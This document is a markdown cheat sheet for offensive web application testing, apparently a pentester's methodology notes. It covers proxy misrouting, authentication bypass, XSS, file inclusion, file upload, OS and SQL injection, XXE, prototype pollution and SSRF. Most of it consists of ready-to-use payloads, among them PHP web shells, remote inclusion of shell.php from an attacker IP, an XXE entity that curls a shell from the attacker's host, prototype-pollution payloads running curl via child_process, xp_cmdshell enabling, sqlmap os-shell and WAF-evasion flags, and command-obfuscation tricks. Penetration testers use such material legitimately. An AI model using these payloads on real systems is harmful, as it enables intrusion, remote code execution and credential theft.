# Exploitation
### Proxy Attacks

*   Host Misrouting
    *   `Host`, `X-Forwarded-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded` → Check if Validated
    *   Invalid / Duplicate / Wrapped / Domain Parsing / Port Value / Absolute URLs
    *   SSRF                                  → `GET http://[URL]@[OOB/INTRANET_IP]` + Header OOB Values
    *   Server-Side Injections   → URL String Parts
*   Path Misrouting
    *   `GET ../../../../../../[LOCAL_FILE]`
    *   `GET ..;/..;/..;/..;/..;/..;/[LOCAL_FILE]`
    *   Encodings                        → URL / Double URL / Unicode / Nested / UTF-8
    *   Non-Standard Proxies  → Different from Apache / Nginx
*   Parameter Pollution
    *   `GET /transfer.php?param=1&param=2` → Check Parsing Order
    *   Value Override / WAF Bypass
    *   [Exploitation](https://book.hacktricks.xyz/pentesting-web/parameter-pollution)
*   Verb Tampering
    *   `curl -kILX OPTIONS [URL]`                            → GET / POST / PATCH / Other
    *   `X-HTTP-Method`, `X-HTTP-Method-Override`   → 405 Bypasses
    *   Denied Requests                                             → Replace Method + Resend
*   40X Bypasses
    *   `bypass()    [FORBIDDEN_URL]` → Nested / Recursively
    *   `httpbrute() [401_URL]`             → Stealing `/[WEB_ROOT]/[html/HOST]/.htpasswd` + APR1 Hashcat Cracking
    *   Method Confusion
    *   H2C Smuggling
    *   [Path Normalization](https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules)
    *   X-Forwarded-For / X-Real-IP Spoofing
*   30X Injections
    *   CRLF
        *   `crscan() [URL_OR_QUERY]`
        *   [Exploitation](https://techbrunch.github.io/patt-mkdocs/CRLF%20Injection/#summary)
    *   Open Redirection
        *   `redscan() [URL/PATH_OR_QUERY]`
        *   Header/Location Reflection
        *   [Exploitation](https://github.com/payloadbox/open-redirect-payload-list)
*   ESI Injection
    *   `Surrogate-Control: content="ESI/1.0"`
    *   `Hell<!--esi-->o`                                             → "Hello" Reflection
    *   `<esi:include src=http://attacker.com>` → OOB Detection
    *   [XSLT RCE](https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
    *   [Exploitation 101](https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection) / [102](https://gosecure.ai/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
*   HTTP Smuggling
    *   `smuggle() [POST_URL]`
    *   [Exploitation](https://portswigger.net/web-security/request-smuggling/exploiting) → Host Misrouting / Response Poisoning / Session Stealing
*   Cache Poisoning
    *   [Cache Headers](https://www.virtuesecurity.com/kb/cache-controls-explained/)                               → `poison() [URL]`
    *   Header Discovery & Tampering   → [Cache Harmful Response](https://book.hacktricks.wiki/en/pentesting-web/cache-deception/index.html) 
*   [Race Conditions](https://portswigger.net/web-security/race-conditions#methodology)
    *   [Send Parallel Requests](https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group#sending-requests-in-parallel)   → Turbo Intruder / GitHub Tools
    *   Limit Overrun                      → Functions that perform a check → act state transition
    *   Partial Construction          → Send Parameters matching a temporary state type
    *   Timestamp Hashing         → Parallel Requests will generate the same Tokens
    *   [Multi-Endpoint Racing](https://portswigger.net/research/smashing-the-state-machine)
*   WSS Injection
    *   WSS Traffic Interception → User Input in `wss://` URLs
    *   [Exploitation](https://portswigger.net/web-security/websockets#websockets-security-vulnerabilities)

### User Handling

*   Registration
    *   Arbitrary Sign-Up
    *   [Account Takeover](https://book.hacktricks.xyz/pentesting-web/registration-vulnerabilities)
*   [Authentication](https://book.hacktricks.xyz/pentesting-web/login-bypass)
    *   [MFA](https://portswigger.net/web-security/authentication/multi-factor) / [OAuth](https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover) / [SAML](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SAML%20Injection)
    *   Password Spraying / User Bruteforcing
    *   Injection Bypass
        *   [SQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)         → `random[',"][)] or 1=1-- -`
        *   [NoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)   → `random[',"][)] || 1==1//` / `user[$ne]=toto&pass[$ne]=toto` / `{"$ne": null}` JSON Values
        *   [LDAP](https://book.hacktricks.xyz/pentesting-web/ldap-injection)     → User: `*)(uid=*))(|(uid=*` + Password: `random`
        *   [XPATH](https://book.hacktricks.xyz/pentesting-web/xpath-injection)
    *   Type Juggling
        *   Array Types                  → `user[]=[EMPTY/RANDOM/VALID]&pass[]=[EMPTY/RANDOM/VALID]`
        *   Magic Hashes             → `QNKCDZO` / `10932435112` / `10885164793773`
        *   Request Confusion   → URL / JSON / XML + GET / POST
        *   NodeJS Bypass          → Valid Username + `"password":{"password": 1}` / `password[password]=1`
        *   Broken Logic              → Parameter Number + Valid Usernames
    *   Cookie Hijacking
        *   [Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
        *   Encoded Tampering
    *   [Reset/Forgot Poisoning](https://github.com/tuhin1729/Bug-Bounty-Methodology/blob/main/PasswordReset.md)
        *   Server-Side Injections
        *   Token Validation / Encryption / Redirection
        *   [More Exploits](https://book.hacktricks.xyz/pentesting-web/registration-vulnerabilities#password-reset-takeover)
*   Session
    *   Client Forms
        *   Contact / Chat / Support / File Sending / User Profile
        *   Phishing / Server-Side Injections
    *   Cookie Hijacking
        *   Encoded Tampering
        *   Insecure Deserialization
        *   Session Disclosures  → PHP LFI Files / Java `actuator/sessions`
        *   Broken Encryption   → JWT / Flask / [Oracle Padding](https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies#extra-vulnerable-cookies-checks) 
    *   [XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
        *   [WAF Bypasses](https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass)
        *   Reflected
            *   `xsscan() [URL]`  → [Polyglot Strings](https://github.com/payloadbox/xss-payload-list)
            *   CSTI                       → `tplscan() [URL]` → [AngularJS / Vue / Mavo Payloads](https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti) 
            *   HTML                    → [Dangling Markup](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection)
            *   File Uploads        → SVG / XML / HTML / MD / CSS       
            *   PDF Rendering
        *   Blind
            *   [BXSSHunter](https://bxsshunter.com/) / `httpserv()` → Script SRC
            *   Client Forms / User Profile
        *   DOM / CSSP
            *   `wingman --chrome` + [DOM Invader](https://portswigger.net/web-security/dom-based)
            *   WSS Post-Messages
            *   [Exploitation](https://portswigger.net/web-security/prototype-pollution/client-side)
        *   30X Injections
            *   CRLF
                *   `crscan() [URL_OR_QUERY]`
                *   [Exploitation](https://techbrunch.github.io/patt-mkdocs/CRLF%20Injection/#summary)
            *   Open Redirection
                *   `redscan() [URL/PATH_OR_QUERY]`
                *   Header/Location Reflection
                *   [Exploitation](https://github.com/payloadbox/open-redirect-payload-list)
        *   [Exploitation](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#cors)
            *   `document.domain`  → Check XSS Domain Context
            *   Cookie Grabbing → Missing `HttpOnly`
            *   XHR Response Stealing & Request Forgery
            *   Browser Redirection Phishing
            *   Key Logging / Beef Hooking
    *   Cross-Site Attacks
        *   [CSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site%20Request%20Forgery)                  → `SameSite: [Lax/None]` / GET Requests / [PoCs](https://csrfshark.github.io/app/) / [CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) WSS Traffic
        *   [ClickJacking](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking)    → `data:text/html,<iframe src=[URL]>`
        *   [XSSI](https://book.hacktricks.xyz/pentesting-web/xssi-cross-site-script-inclusion)                    → Untrusted Script SRC Attributes
        *   [CORS](https://0xn3va.gitbook.io/cheat-sheets/web-application/cors-misconfiguration)                 → `corscan [URL]` / XHR Response Stealing & Request Forgery
    *   [Cache Deception](https://portswigger.net/web-security/web-cache-deception)
        *   `GET user_profile.php/[PAYLOAD]` → Force Caching of Session
        *   Payloads
            *   `random.[js, css, avif, png]`
            *   `../random.[js, css, avif, png]`
            *   `backend.php.[js, css, avif, png]`
            *   URL Encoding
            *   [Exploitation](https://portswigger.net/web-security/web-cache-deception)
*   Authorization
    *   Post-Authentication
        *   User Profiles / Sensitive Exposure / Admin Panels
        *   Server-Side Attacks / Endpoints & Parameters
        *   Settings Overwrite
        *   Session Stealing Attacks / Client-Side Functionalities
    *   IDOR / BFLA
        *   Guessable / Encoded / Hashed ID Values / [Broken Randomness](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Randomness)
        *   Info Disclosure / Reset Poisoning / User Patching
        *   Endpoints with Missing Authorization
    *   [Broken Logic](https://portswigger.net/web-security/logic-flaws)
        *   Standard User Privileges
        *   Unintended Actions 
        *   Race Conditions

### Template Injection

*   Template Engines  → Mako / Jinja2 / Razor / Handlebars / Smarty / Twig / FreeMaker
*   `<%'${{/#{@}}%>{{`   → Input & Reflected Errors
*   `tplscan() [URL]`     → Crawling & Blind Payload
*   [Exploitations](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) / [Cheat Sheet](https://github.com/Hackmanit/template-injection-table) / [Jinja2 Bypasses](https://0day.work/jinja2-template-injection-filter-bypasses/)

### File Inclusion

*   Enumeration
    *   File Fetching / Page Inclusion / Language Parameters
    *   Headers            → `Accept-Language` / `Accept` 
    *   Request Send → Burp Proxy / `curl -ksL --path-as-is [LFI_URL]`
    *   [LFIMap](https://github.com/hansmach1ne/LFImap)
*   Files
    *   Fuzzing Wordlists         → [Generic](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) / [Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) / [Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)
    *   Test Files                          → `C:\windows\boot.ini`, `/etc/passwd`
    *   Credential Files             → `/etc/passwd`, `/etc/shadow` / `[WEB_ROOT]/.htpasswd` / SSH Keys / SAM & SYSTEM
    *   Configuration Files      → Services & Applications → Research + Local Installation
    *   Backend PHP Read
        *   `php://filter/convert.base64-encode/resource=[BACKEND_FILE]`
        *   Web Roots
            *   Linux         → `/var/www/[html/HOSTNAME]`
            *   Windows  → `c:\xampp\htdocs`, `c:\inetpub\wwwroot`
    *   Virtual Hosts
        *   Linux
            *   `[/usr/local]/etc/[nginx,apache,apache2,apache24]`
            *   `[NGINX_CONFIG]/sites-available/default`
            *   `[APACHE_CONFIG]/sites-enabled/000-default.conf`
        *   Windows
            *   Nginx    → `C:\nginx\conf\sites-enabled`
            *   Apache
                *   `C:\xampp\apache\conf\extra\httpd-vhosts.conf`
                *   `C:\Program Files\Apache Group\Apache[2/2.2/2.4]\conf\extra\httpd-vhosts.conf`
*   Obfuscation
    *   Absolute Paths    → `/[PATH]` → `\[WIN_PATH]` → `../../../../../../[LIN_WIN_PATH]`
    *   URL                         → `%2e%2e%2f`
    *   Double URL          → `%252e%252e%252f`
    *   UTF-8                      → `%c0%ae%c0%ae/`
    *   Nullbyte                 → `[FILE]%00`
    *   Nested                    → `..././` → `/%5C../` → `..///////..////..//////`
    *   Truncation             → `../[MORE]../[FILE]` → `../[FILE]/././.[MORE]`
    *   PHP Extensions   → `.txt` / `.phtml` / `.png`
    *   PHP Payloads
        *   `<?php echo system('[OS_COMMAND]');?>`
        *   `<?php echo system($_GET['cmd']);?>` → GET Query to `shell.php?cmd=[OS_COMMAND]`
        *   ``<?php echo `[OS_COMMAND]`?>``
*   RCE / LLMNR
    *   RCE                               → Backend File Upload + Folder Discovery
    *   RCE RFI                        → `[http/ftp]://[KALI_IP]/shell.php` / `\\[KALI_SMB_IP]\shell.php` → [Test With Samba](https://0xdf.gitlab.io/2020/03/28/htb-sniper.html)
    *   RCE Wrappers           → `data://text/plain;base64,[BASE64_PHP_SHELL]&cmd=id` / `expect://[OS_COMMAND]`
    *   RCE                               → `curl -s --data "[PHP_CMD_SHELL]" [URL]?param=php://input&cmd=id`
    *   RCE ([Zip Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#wrapper-zip))    → `zip://shell.jpg/shell.php`
    *   RCE ([Phar Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#wrapper-phar)) → `phar://shell.jpg` / [Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#phar-deserialization) → Requesting `phar://shell.jpg` Creates `/shell.php` in the same directory
    *   RCE                               → [PHP Filter](https://github.com/synacktiv/php_filter_chain_generator) (No Upload Required)
    *   LLMNR                         → `\\[RESPONDER_IP]\x`
*   Log Poisoning
    *   PHP Session
        *   `/var/lib/php/sessions/sess_[PHPSESSID]`
        *   `/var/lib/php5/sess_[PHPSESSID]`
        *   `C:\Windows\Temp\sess_[PHPSESSID]`
        *   [Exploitation](https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-session) → PHP Code in Username / Response Content & Body
    *   Apache / Nginx
        *   `[LOG_FOLDER]/[access/error].log` 
        *   `[LOG_FOLDER]/httpd-[access/error].log`
        *   Common Log Folders
            *   `/var/log/[EMPTY/apache2/apache24/nginx]/`
            *   `C:\xampp\apache\logs\`
            *   `C:\nginx\logs\`
            *   [Fuzzing Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) / Research
        *   Exploit
            *   `curl [HOST] -A “[PHP_PAYLOAD]”`
    *   Network
        *   [FTP](https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning)    → `/var/log/vsftpd.log`
        *   [SSH](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#rce-via-ssh)    → `/var/log/sshd.log`, `/var/log/auth.log`
        *   [SMTP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#rce-via-mail) → `/var/log/mail`   
    *   Processes
        *   [User-Agent](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi-to-rce-via-procselfenviron) → `/proc/self/environ`
        *   [PID Exploit](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi-to-rce-via-procfd)  → `/proc/[PID]/fd/[FD]` (Bruteforce)
    *   PHPInfo
        *   `python lfito_rce.py -l "[QUERY_URL]" --lhost=[KALI_IP] --lport=[PORT] -i [PHPINFO_URL]`
        *   [Exploit](https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/phpinfo)

### File Upload

*   Tools
    *   [Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
    *   [Mind Map](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Upload%20Insecure%20Files/Images/file-upload-mindmap.png?raw=true)
    *   Burp Upload Scanner
*   Allowed Files
    *   [Backend Executables](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#defaults-extensions) → Upload Directory Discovery
    *   Configuration Files
        *   [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess) / [httpd.conf](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf)  → Apache
        *   [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config)                       → ASP.NET
        *   [package.json](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#configuration-files)                   → NodeJS Packages
        *   [composer.json](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#configuration-files)                → PHP Packages
        *   [\_\_init\_\_.py](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py)
        *   [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini)
    *   PNG / JPG / DJVU / XML / ZIP
        *   [DJVU + EXIFTOOL RCE](https://github.com/LazyTitan33/ExifTool-DjVu-exploit)
        *   [ImageMagick 7.0.1-1](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files) / [7.1.0-49 beta](https://github.com/kljunowsky/CVE-2022-44268)
        *   [Jetty XML RCE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#jetty-rce)
        *   [ZIP Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#zip-archive)
        *   [PHP Compression Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#picture-compression)
    *   MP4 / AVI / WAV
        *   [FFMPEG CVE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS)
    *   [SVG](https://github.com/allanlw/svg-cheatsheet)
        *   SSRF
        *   XSS
        *   XXE 
        *   LFI
        *   RCE
    *   XML / HTML / MD / CSS
        *   XSS
        *   LFI
    *   Arbitrary Read
        *   Upload Malicious File → Request / Download 
        *   Non-Textual Content  → `cat [DOWNLOADED_FILE] | grep [HEX_PORTION] | xxd -r -p > [OUTPUT]`
*   Filter Bypass
    *   Client-Side Validation
        *   Send Allowed File                     → Intercept Request
        *   Change Filename & Content → Send
    *   Type Confusion
        *   `Content-Type: image/[png/gif/jpeg]`
        *   [Fuzzing Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
        *   Double Header → Unallowed + Allowed
    *   MIME Confusion
        *   `echo '[BYTES]<?php system($_GET["cmd"]); ?>' > shell.[IMG_EXTENSION]`
        *   PNG → `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[`
        *   JPG  → `\xff\xd8\xff`
        *   GIF   → `GIF87a` / `GIF8` / `GIF8;`
    *   Extension Bypass
        *   [Extension Fuzzing](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
        *   Wrapping
            *   `.[EXECUTABLE].[ALLOWED]`
            *   `.[ALLOWED].[EXECUTABLE]`
            *   `.%E2%80%AE[EXECUTABLE].[ALLOWED]`
        *   Case Switching
            *   `PhP5`
            *   `ASp`
        *   Slash Break
            *   `.[EXECUTABLE]/`
            *   `.[EXECUTABLE].\`
            *   `.[EXEC\UTABLE]`
            *   `.[EXECU/TABLE]`
            *   `.[EXECUTABLE]/././././.`
        *   ADS Stream
            *   `file.[IIS_EXECUTABLE]:.[ALLOWED]`
            *   `file.[IIS_EXECUTABLE]::$data.`
        *   Character Injection
            *   `.[EXECUTABLE][STR].[ALLOWED]`
            *   `[STR].[EXECUTABLE].[ALLOWED]`
            *   `.[ALLOWED].[EXECUTABLE][STR]`
            *   `.[ALLOWED][STR].[EXECUTABLE]`
            *   Strings
                *   `%20` → `%0a` → `%0d0a`
                *   `;`     → `:`     → `...`
                *   `%00` → `\x00`
                *   [Homoglyphs](https://www.irongeek.com/homoglyph-attack-generator.php)
    *   Injection / XSS
        *   Filename
            *   Reflected / Processed → XSS / SSTI / CSTI / SQL / OS / LFI
            *   `'"><img src=x onerror=alert(document.domain)>.png`
            *   `poc.js'(select*from(select(sleep(20)))a)+'.jpg`
            *   `file';select+sleep(5);--.jpg`
            *   `file$(sleep 5).png`
            *   `image.png../../../../../../../etc/passwd`
        *   [EXIF Tags](https://exiv2.org/tags.html)
            *   Metadata Reflection / Processing
            *   `convert -size 110x110 xc:white file.png`
            *   `exiftool -[TAG]="[INJECTION/BACKEND/XSS]" file.png`

### OS Injection

*   Enumeration
    *   Formatted Data Parsers
    *   PREG Replace PHP
    *   OS Input Processing → Inference of `cat` / `tar` / `curl` / `wget` / `ping` / `tee` / Argument Parsing
*   Tools
    *   `osscan() [RAW_REQUEST]`
    *   [Command Injections](https://book.hacktricks.xyz/pentesting-web/command-injection) / [Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)
    *   [Argument Injections](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Argument%20Injection) → CURL / FIND / WGET / TAR
    *   [JNDI Injections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Log4Shell.md)            → Header Values + Java Logging
*   Manual
    *   Comments → End payload with `#` or `//` or Language-Specific
    *   `[INPUT][SEPARATOR][COMMAND]`
    *   `` [INPUT]`[COMMAND]` ``
    *   `[INPUT]$([COMMAND])`
    *   Commands
        *   Windows → Start Commands with `cmd /c`
        *   `whoami` / `ping` Check
        *   `echo test > [WEB_READABLE_FILEPATH]`
    *   Obfuscators
        *   [Linux](https://github.com/Bashfuscator/Bashfuscator)
        *   [Windows](https://github.com/danielbohannon/Invoke-DOSfuscation) + Kali `pwsh`
    *   Separators
        *   `;`
        *   `\n`
        *   `&`
        *   `|`
        *   `&&`
        *   `||`
    *   Char Obfuscations
        *   `/` → `echo ${PATH:0:1}`
        *   `;` → `echo ${LS_COLORS:10:1}` / `echo $(tr '!-}' '"-~'<<<:)`
        *   `\` → `echo %HOMEPATH:~6,-11%` / `$env:HOMEPATH[0]` / `echo $(tr '!-}' '"-~'<<<[)`
    *   [Space Obfuscations](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)
        *   `%20`
        *   `%09`
        *   `${IFS}`
        *   `{ls,-la}`
    *   Words Obfuscations
        *   Mix with Space/Char Obfuscations
        *   `w'h'o'am'i`
        *   `w\ho\ami`
        *   `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` / `$(a="WhOaMi";printf %s "${a,,}")`
        *   `$(rev<<<'imaohw')` 
        *   Windows
            *   `who^ami`
            *   `WhOAmi`
            *   `"$('imaohw'[-1..-20] -join '')"`
    *   B64 Obfuscation
        *   Linux
            *   `echo -n [CMD] | base64`
            *   `bash<<<$(base64 -d<<<[B64_STRING])`
        *   Windows
            *   `echo -n [CMD] | iconv -f utf-8 -t utf-16le | base64`
            *   `“$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('B64')))”`

### SQL Injection

*   Enumeration
    *   DB Requests → User Handling Functionalities / ID Lookups / Integer Mappings
    *   Injections       → Error / Union / Blind / Stacked / OOB / [Header Blind](https://github.com/SAPT01/HBSQLI)
    *   [SQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)                → Postgres / MSSQL / MySQL / H2 Java
    *   [NoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)          → MongoDB / Oracle
*   MSSQL Stacked
    *   LLMNR
        *   `?param=8; EXEC master ..xp_dirtree '\\10.10.14.5\test'; --`
    *   RCE
        *   `?param=8; EXEC sp_configure 'show advanced option', '1'; GO; RECONFIGURE; --`
        *   `?param=8; EXEC sp_configure 'xp_cmdshell', 1; GO; RECONFIGURE; --`
        *   `?param=8; EXEC master ..xp_cmdshell '[OS_CMD]'; --`
*   SQLMap
    *   Cheat Sheet
        *   `sqlmap [-u/r] [URL/REQUEST.req] --dbms [DB_TYPE] --level=5 --risk=3 --threads 10 --batch --dbs --flush-session`
        *   DB Types            → `MySQL` / `MariaDB` / `Microsoft SQL Server` / `Oracle` / `PostreSQL` / `Sqlite`
        *   POST Data         → `--data [PAYLOAD]`
        *   Parameter         → `-p [PARAM_NAME]` / Omit to Test Full Request
        *   Injection Type   → `--technique=[B,E,U,T,S]` → Supports Multiple: `BETS` / Avoid Time if Possible
        *   WSS URLs          → `-u [ws://HOST:PORT]`
        *   WAF Bypass      → Tamper Scripts / `--random-agent` / `--level 1 --risk 1` / Manual Payloads
    *   Data Dumping
        *   Full DB          → `--dbs` / `--schema` → `-D [DB_NAME] --dump`
        *   Tables            → `-D [DB_NAME] --tables`
        *   Columns       → `-D [DB_NAME] -T [TABLE] --dump`
        *   Username    → `--current-user`, `--is-dba`, `--users`, `--privileges`
        *   Banner          → `--banner`
        *   Passwords    → `--passwords`
        *   SQL Queries → `--sql-shell`
    *   Code Execution
        *   `--os-shell`
        *   [H2 Java SQLi RCE](https://attacke.rs/posts/h2-sqli-rce/)
    *   OS Read / Upload
        *   `--file-read=[PATH]`
        *   `--file-write=[SRC] --file-dest=[DEST]`
    *   Tuning
        *   Filtering
            *   `--code=[STATUS]`
            *   `--string=[RESPONSE_STRING]`
            *   `--text-only`
        *   UNION
            *   `--union-char="a"`
            *   `--union-from=users`
            *   `--union-cols=[COLS]`
        *   Evasion
            *   `--randomize=[PARAM]`
            *   `--chunked`
            *   `--tamper=[TAMPER_SCRIPTS]`
            *   `--random-agent --tor --tor-type=SOCKS5 --check-tor`

### XXE Injection

*   Enumeration
    *   XML / JSON Requests & Conversions
    *   [Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md) / [Obfuscations](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#waf-bypasses) / [Payloads](https://github.com/payloadbox/xxe-injection-payload-list)
    *   XML Header    → `<?xml version="1.0" encoding="utf-8" standalone="yes"?>`
    *   Content Type  → `Content-Type: application/xml`
*   RCE
    *   `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "expect://[CMD]"> %xxe; ]>`
    *   `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'"> %xxe; ]>`
*   SSRF
    *   `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "[INTERNAL_HOST]"> ]>`
    *   Access Internal Servers
    *   Bypass Restrictions
    *   [Exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
*   LFI
    *   Standard
        *   `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://[FILE_OR_DIR]"> ]>`
    *   Filter Wrapper
        *   `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=[BACKEND_FILE]"> ]>`
    *   XInclude
        *   `<foo xmlns:xi="http://www.w3.org/2001/XInclude">`
        *   `<xi:include parse="text" href="file:///etc/passwd"/></foo>`
    *   CDATA
        *   `echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd`
        *   [Backend / Local File Read](https://academy.hackthebox.com/module/134/section/1206)
    *   Error-Based
        *   [Local](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#error-based---using-local-dtd-file) / [Remote](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#error-based---using-remote-dtd)
        *   `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "[YOUR_SERVER]/evil.dtd"> %xxe; %err; ]>`
        *   \----evil.dtd-----
        *   `<!ENTITY % file SYSTEM "file://[FILE]">`
        *   `<!ENTITY % err "<!ENTITY content SYSTEM '%idontexist;/%file;'>">`
        *   \-----------------
    *   [OOB](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
        *   [XXEInjector](https://github.com/enjoiz/XXEinjector)
        *   Place `XXEINJECT` after XML Header → Copy Raw Request
        *   `ruby XXEinjector.rb --host=[KALI_IP] --httpport=8000 --file=[XXE_REQUEST] --path=[FILE_TO_READ] --oob=http --phpfilter`

### SSPP Injection

*   URI String
    *   `ppscan() [URL]`
*   JSON Input
    *   Burp Extension → Server-Side Prototype Pollution Scanner
    *   Confirmation
        *   `"__proto__":{ "foo":"bar" }`           → Data Reflection / Object Assignment
        *   `"__proto__":{ "status":400 }`         → Status Code Override
        *   `"__proto__":{ "json spaces":10 }` → Indentation Change
        *   `"__proto__":{ "content-type": "application/json; charset=utf-7" }` → `"+AGYAbwBv-"` + `foo`
        *   Obfuscation
            *   `"constructor": { "prototype": { [PAYLOAD] } }`
    *   RCE Payloads
        *   `"__proto__": { "shell":"node", "NODE_OPTIONS":"--inspect=BURP-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com" }`
        *   `"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('curl https://COLLABORATOR-ID.oastify.com')" ] }`
        *   `"__proto__": { "shell":"vim", "input":":! curl https://COLLABORATOR-ID.oastify.com\n" }`

### SSRF

*   Enumeration
    *   URI Fetching Parameters
    *   [SSRFMap](https://github.com/swisskyrepo/SSRFmap) / [Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-exploitation-via-url-scheme) / [Techniques](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery) / [HTB Module](https://academy.hackthebox.com/module/details/145)
*   OOB
    *   `http[s]://[collab]`
    *   `http[s]://[whitelisted]:random@[collab]`
    *   `http[s]://[collab]#[whitelisted]`
    *   `http[s]://[whitelisted].[collab]`
*   Blind Fuzzing
    *   `[protocol]://[localhost]:[port]` → Status / Timing / Content Difference → Rersponse Data / WebServers
    *   Localhost Values
        *   `127.0.0.1`
        *   `[0:0:0:0:0:ffff:127.0.0.1]`
        *   `[::ffff:127.0.0.1]`
        *   `[::]`
        *   `[0000::1]`
        *   `2130706433`
        *   `0`
        *   `127.1`
        *   `localhost:00011211aaaa`
        *   `0o177.0.0.1`
        *   `google.127.0.0.1.nip.io`
